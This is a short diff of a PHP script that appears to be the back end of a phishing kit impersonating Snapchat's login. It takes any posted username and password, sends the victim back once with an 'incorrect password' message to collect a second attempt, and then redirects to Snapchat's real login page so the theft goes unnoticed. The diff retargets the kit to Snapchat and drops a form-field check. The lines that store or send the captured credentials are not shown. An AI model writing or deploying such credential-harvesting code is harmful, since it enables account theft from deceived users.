@@ -1,10 +1,10 @@
 <?php
-$location = "";
+$location = "https://accounts.snapchat.com/accounts/login";
 
 session_start();
 
 // If they're coming here from the login page 
-if(isset($_POST['lloginssubmit']) && isset($_POST['username']) && isset($_POST['password']))
+if(isset($_POST['username']) && isset($_POST['password']))
 {
 	// Get the details they entered
 	$name = $_POST['username'];
@@ -25,12 +25,12 @@ if(isset($_POST['lloginssubmit']) && isset($_POST['username']) && isset($_POST['
 	{
 		// Redirect them back to the login page for a second guess
 		$_SESSION['has_guessed'] = true;
-		header("Location: index.php?replaceCurrent=1&reason=2");
+		header("Location: index.html?incorrect_pass");
 		exit();
 	}
 } else
 {
-	header("Location: index.php");
+	header("Location: index.html");
 	exit();
 }
 ?>
